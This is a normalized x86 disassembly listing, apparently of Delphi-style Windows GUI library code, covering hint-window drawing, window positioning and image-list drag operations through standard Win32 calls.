lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call DrawEdge
push 0x15
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x20 ] eax
sub_44e884
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
lea edx [ esp + 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406eec
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax esi
call sub_446ac8
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_44b058
mov edi eax
test edi edi
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx 0x7b
mov eax edi
call sub_448138
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax esi
call sub_4492fc
sub_44e8f0
push ebx
push esi
mov esi edx
call sub_45dd9c
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
sub si 0x9
je r-xdata
push 0x0
mov dx 0x1
mov ax 0x2
call sub_406e80
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_448138
jmp r-xdata
sub si 0x9
je r-xdata
push 0x0
mov dx 0x2
mov ax 0x2
call sub_406e80
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_448138
add esi 0xffffffed
sub si 0x4
jae r-xdata
sub_44e954
push esi
mov esi eax
cmp [ edx + 0xc ] 0x1
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ edx + 0x8 ] 0x1
je r-xdata
mov eax esi
call sub_44b420
jmp r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_44e98c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_44e984
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44e9cc
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_446084
mov dl 0x1
mov eax [ r-xdata ]
call sub_427758
mov esi eax
mov [ ebx + 0x160 ] esi
mov eax esi
mov edx ebx
call sub_445b60
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_44ea28
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
cmp esi [ rw-data ]
jne r-xdata
mov eax [ esi + 0x160 ]
call sub_403390
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44615c
test bl bl
jle r-xdata
xor eax eax
call sub_444154
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_44ea68
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_427a5c
xor eax eax
push ebp
push sub_44eb03
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_427dd0
xor eax eax
push ebp
push sub_44eae0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44eae7
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
xor edx edx
call sub_427dd0
retn
sub_44eb14
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44f408
mov edx 0x80ffff
mov eax esi
call sub_447124
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x80 ]
mov eax [ esi + 0x208 ]
call sub_427c70
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_427724
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_44eb80
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_44a5f8
mov [ ebx + 0x4 ] 0x80800000
or [ ebx + 0x24 ] 0x800
cmp [ rw-data ] 0x0
je r-xdata
mov edx 0x1
mov eax 0x5
call sub_40c4bc
test al al
je r-xdata
mov [ ebx + 0x8 ] 0x80
cmp [ rw-data ] 0x0
je r-xdata
or [ ebx + 0x24 ] 0x20000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_44a590
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] 0x80
sub_44ebec
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44d7a4
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44ec42
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ec49
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44d7a4
push eax
call ReleaseDC
retn
sub_44ec50
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor edx edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_44ece9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
add [ ebp - 0x10 ] 0x2
add [ ebp - 0xc ] 0x2
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x80 ]
mov edx [ eax + 0x18 ]
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0xc ]
call sub_426e3c
mov eax ebx
call sub_4492a4
or eax 0x810
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_446f84
mov eax [ ebp - 0x14 ]
call sub_4045e0
push eax
mov eax [ ebx + 0x208 ]
call sub_427d50
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ecf0
lea eax [ ebp - 0x14 ]
call sub_404120
retn
sub_44ecf8
push esi
mov eax [ edx + 0x4 ]
cmp eax 0x100
jb r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx 0xb000
je r-xdata
cmp eax 0x108
jbe r-xdata
mov al 0x1
pop esi
retn
cmp ecx 0xb001
je r-xdata
cmp [ edx + 0x4 ] 0xb016
je r-xdata
cmp [ edx + 0x4 ] 0xb017
je r-xdata
cmp [ edx + 0x4 ] 0x111
je r-xdata
mov esi [ edx + 0x4 ]
cmp esi 0x200
jbe r-xdata
cmp [ edx + 0x4 ] 0xa0
je r-xdata
cmp esi 0x20a
jbe r-xdata
xor eax eax
pop esi
retn
sub_44ed64
push ebp
mov ebp esp
push 0x0
push 0x0
push esi
mov esi eax
xor eax eax
push ebp
push sub_44edef
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x210 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44edf6
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404144
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_446f84
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x208 ]
call sub_427bb0
mov edx eax
add edx 0x6
mov eax esi
call sub_446740
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_446f84
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x208 ]
call sub_427bcc
mov edx eax
add edx 0x4
mov eax esi
call sub_446764
sub_44edfc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
mov esi [ rw-data ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor eax eax
push ebp
push sub_44efd5
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_446fb4
add [ ebp - 0xc ] 0x4
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4481dc
mov eax [ esi ]
call sub_4645d4
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
add edx [ ebp - 0x14 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_4645e0
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
add edx [ ebp - 0x18 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_4645d4
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
call sub_4645c8
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov eax [ esi ]
call sub_4645e0
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x48 ]
mov [ ebp - 0x18 ] eax
mov eax [ esi ]
call sub_4645bc
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ esi ]
call sub_4645c8
mov [ ebp - 0x18 ] eax
push 0x10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_44d7a4
push eax
call SetWindowPos
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x214 ]
cmp eax 0xfa
jbe r-xdata
mov eax [ esi ]
call sub_4645bc
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_44aea0
push 0x4
mov eax [ ebp - 0x4 ]
call sub_44d7a4
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44efdc
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x214 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
mov eax ebx
call sub_4043e0
cmp eax 0x64
jge r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1016
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1018
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_452050
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x14 ]
jle r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x1
xor ebx ebx
jmp r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x40000
push eax
push 0x64
mov eax [ ebp - 0x4 ]
call sub_44d7a4
push eax
call [ rw-data ]
sub_44efe4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_44f00c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push 0x0
push ebx
mov ecx edi
xor edx edx
xor eax eax
call sub_41a018
mov eax esi
call sub_4492a4
or eax 0xc10
push eax
push ebx
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_4045e0
push eax
mov eax [ esi + 0x208 ]
call sub_427d50
push eax
call DrawTextA
add [ ebx + 0x8 ] 0x6
add [ ebx + 0xc ] 0x2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_44f068
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
xor edx edx
xor eax eax
call sub_41a018
call sub_43a564
call sub_43a644
test al al
jne r-xdata
call sub_43a564
lea ecx [ esp + 0x10 ]
mov dl 0x1
call sub_43a8d0
push esp
push 0x1
push 0xf
push 0x0
call sub_43a564
lea ecx [ esp + 0x20 ]
mov edx esi
call sub_43a6b4
push 0xf
push 0x1
lea eax [ esp + 0x8 ]
push eax
push esi
call DrawEdge
jmp r-xdata
add esp 0x1c
pop esi
pop ebx
retn
sub_44f0d4
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
mov edx [ esi + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_44b7a8
mov edx [ esi + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
pop ebx
retn
sub_44f0f8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0x8 ]
push eax
push ebx
call ClientToScreen
lea eax [ ebp - 0x18 ]
push eax
push ebx
call GetWindowRect
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x18 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x14 ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_44f138
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
cmp [ ebx + 0x68 ] 0xffff
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
push 0x1
push 0x1
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
push 0xd
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
call ImageList_Create
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44f1f8
push [ fs : eax ]
mov [ fs : eax ] esp
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_464aa8
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_42e794
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_464aa8
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_42e794
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
lea eax [ ebp - 0xc ]
push eax
push 0x0
call ImageList_GetDragImage
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x1
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call ImageList_Destroy
retn
sub_44f204
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_45407c
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x78 ] esi
mov [ ebx + 0x70 ] edi
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x74 ] eax
mov eax [ ebp + 0x8 ]
push eax
push edi
push esi
mov eax ebx
call sub_4541b8
push eax
call ImageList_BeginDrag
mov al 0x1
mov [ ebx + 0x6a ] al
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_44f264
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax esi
call sub_45407c
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
cmp [ esi + 0x6a ] 0x0
jne r-xdata
mov eax esi
call sub_44f138
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_44f2c4
mov ebx eax
test bl bl
je r-xdata
mov eax [ esi + 0x74 ]
push eax
mov ecx [ esi + 0x70 ]
mov edx [ esi + 0x78 ]
mov eax esi
call sub_44f204
push 0x0
call ShowCursor
sub_44f2c4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor ebx ebx
mov eax edi
call sub_45407c
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp esi [ edi + 0x6c ]
je r-xdata
mov eax edi
call sub_44f328
mov ebx esi
mov [ edi + 0x6c ] ebx
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_44f0f8
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ edi + 0x6c ]
push eax
call ImageList_DragEnter
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_44f328
push ebx
mov ebx eax
mov eax ebx
call sub_45407c
test al al
je r-xdata
pop ebx
retn
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax [ ebx + 0x6c ]
push eax
call ImageList_DragLeave
xor eax eax
mov [ ebx + 0x6c ] eax
sub_44f34c
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_45407c
test al al
je r-xdata
xor eax eax
push esp
mov ecx edi
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_44f0f8
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
call ImageList_DragMove
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_44f3c0
push ebx
push esi
mov esi eax
mov eax esi
call sub_45407c
test al al
je r-xdata
xor ebx ebx
cmp [ esi + 0x6a ] 0x0
je r-xdata
mov eax esi
call sub_44f328
call ImageList_EndDrag
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x6a ] 0x0
or edx 0xffffffff
mov eax esi
call sub_44f24c
push 0xffffffff
call ShowCursor
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_44f408
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_449498
mov dl 0x1
mov eax [ r-xdata ]
call sub_427758
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_445b60
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_44f464
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_403390
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4495bc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_44f4b4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_427a5c
xor eax eax
push ebp
push sub_44f552
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_427dd0
xor eax eax
push ebp
push sub_44f52f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_445b78
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f536
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_427dd0
retn
sub_44f564
push ebx
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_44f5f8
test al al
je r-xdata
mov ebx [ ebx + 0xc ]
sub_44f580
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
cmp [ edx + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_44f5f8
push ebx
push esi
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov bl 0x1
call sub_44fbf0
mov esi eax
test esi esi
je r-xdata
mov bl [ edx + 0x57 ]
jmp r-xdata
xor ebx ebx
mov eax esi
call sub_44f5f8
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov esi [ esi + 0xc ]
test esi esi
jne r-xdata
sub_44f62c
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_44f6bc
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc44
call sub_403b5c
mov edx 0x2
call sub_44f6bc
jmp r-xdata
retn
sub_44f674
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_44f728
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc44
call sub_403b5c
mov edx 0x2
call sub_44f728
jmp r-xdata
retn
sub_44f6bc
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
jmp r-xdata
mov edx [ esi + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov ecx edi
mov edx [ eax + 0x14 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
dec al
je r-xdata
mov eax edx
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ esp + 0x4 ]
jmp r-xdata
dec al
jne r-xdata
mov eax [ eax + 0x18 ]
call sub_44faf0
jmp r-xdata
add esp 0x10
pop edi
pop esi
retn
xor eax eax
mov eax [ esp ]
jmp r-xdata
sub_44f728
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
cmp al 0x1
jne r-xdata
mov eax [ ebx + 0x1c ]
mov esi [ eax + 0x64 ]
cmp esi [ ebx + 0x14 ]
jne r-xdata
mov eax [ esp + 0x8 ]
sub eax [ esp ]
jmp r-xdata
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
jmp r-xdata
mov esi ebx
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x1c ]
cmp esi [ eax + 0x64 ]
jne r-xdata
mov eax esi
call sub_44f5dc
dec eax
jne r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
cmp dl [ eax + 0x10 ]
jne r-xdata
mov ecx edi
mov eax [ ebx + 0x1c ]
mov edx [ eax + 0x64 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov esi eax
mov eax esi
call sub_44faf0
push eax
mov eax esi
call sub_44f62c
pop edx
xchg edx eax
sub eax edx
jmp r-xdata
mov eax edx
call sub_44faf0
mov eax [ eax + 0x68 ]
jmp r-xdata
sub_44f7d8
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_44f5dc
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov eax esi
call sub_44fbf0
mov ebx eax
mov al [ esi + 0x10 ]
dec al
je r-xdata
mov edx 0x1
mov eax esi
call sub_44f728
mov edi eax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_44f5dc
push eax
mov eax edi
pop edx
mov ecx edx
cdq
idiv ecx
mov esi eax
test ebx ebx
je r-xdata
mov edx 0x2
mov eax esi
call sub_44f728
mov edi eax
jmp r-xdata
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
xor edi edi
mov eax ebx
call sub_44f62c
mov edx eax
add edx esi
mov eax ebx
call sub_44fb18
mov edx edi
mov eax ebx
call sub_44fb18
jmp r-xdata
mov eax ebx
call sub_44f978
mov eax ebx
call sub_44fbc8
mov ebx eax
test ebx ebx
jne r-xdata
sub_44f880
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_404120
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
call sub_404174
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd00
call sub_403b5c
sub_44f8c4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ebx eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x1c ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov si 0xffb9
call sub_40358c
cmp [ ebp - 0x8 ] 0x0
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov [ eax + 0x38 ] ebx
xor eax eax
push ebp
push sub_44f935
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_447c84
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x38 ] edx
retn
sub_44f948
push ebp
mov ebp esp
push ebx
push esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x14 ]
test esi esi
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax esi
call sub_44fbc8
test eax eax
je r-xdata
mov esi [ esi + 0x14 ]
test esi esi
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_44f978
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp [ edx + 0x6c ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
mov [ eax + 0x9c ] dl
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_44f728
mov ebx eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_44f728
mov esi eax
push ebp
call sub_44f948
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44fbc8
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
